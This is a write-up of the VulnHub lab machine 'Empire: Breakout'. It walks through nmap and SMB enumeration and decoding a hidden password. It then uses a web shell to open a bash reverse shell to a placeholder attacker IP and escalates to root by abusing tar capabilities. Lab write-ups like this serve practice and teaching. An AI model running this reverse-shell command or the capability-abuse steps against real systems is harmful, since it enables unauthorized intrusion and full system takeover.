# Empire: Breakout (VulnHub) - Write-up

- **Description:** Step-by-step resolution of the "Empire Breakout" vulnerable machine to practice enumeration techniques, web exploitation, and privilege escalation through local binary manipulation.
- **Difficulty:** Easy
- **OS:** Linux

## 1. Reconnaissance and Enumeration

The first step was to identify open ports and exposed services on the machine using the following Nmap scan command: 

`nmap -p- -sV -sC -sS -vvv -n -Pn --min-rate=5000 <TARGET_IP> -oN scan`

#### Results:

- Identified two web servers with login panels.
- Inspecting the source code of both web pages, some encrypted text was found. After analyzing it, it was determined to be *Brainfuck* programming language.
- Decoding the text using *dCode* revealed a potential password, which was saved to a local file (`echo "password" >> file`)

At the same time, I proceeded to enumerate target information using network protocols (SMB/RPC) with the following command: 

`enum4linux -a <TARGET_IP>`

#### Results: 

- We obtained a list of system users.
- We now can attempt brute-force attacks using that list and the previously decoded password. 

## 2. Explotaition and Initial Access

Using the previously obtained credentials, we successfully logged into one of the two web pages. This page contained a Web Shell, so we proceeded to prepare a Reverse Shell. 

#### Preparing our machine:

- We set up a Netcat listener on port 443 for our machine: `nc -nlvp 443`

#### Target server execution:

- We used the following Bash command in the Web Shell to redirect inputs and outputs to our machine: `bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1`

#### Result: 

- Initial access to the machine with an interactive console. 

## 3. Privilege Escalation

Our goal here is to obtain root privileges. We proceeded to look for escalation vectors by reviewing the capabilities of system binaries. 

#### Command used to search for Capabilities:

`getcap -r / 2>/dev/null`

#### Vulnerability found:

While exploring the system, we navigated to the backups directory: cd /var/backups. We identified that the local tar binary had assigned capabilities allowing it to read restricted files. In this same directory, there was a hidden file named .old_pass.bak which could not be read with a standard cat command due to lack of permissions.

#### Binary exploitation to read the file:

The tar binary was used to archive the protected file and then extract it, bypassing the reading restrictions.

`./tar -cf pass.tar /var/backups/.old_pass.bak`
`tar -xvf pass.tar`

Once the file was extracted, its contents were read:

`cat .old_pass.bak`

#### Final Result:

The file contained the root user's password in plaintext. The su root command was used, the obtained password was entered, and the machine was fully compromised, granting complete system control.




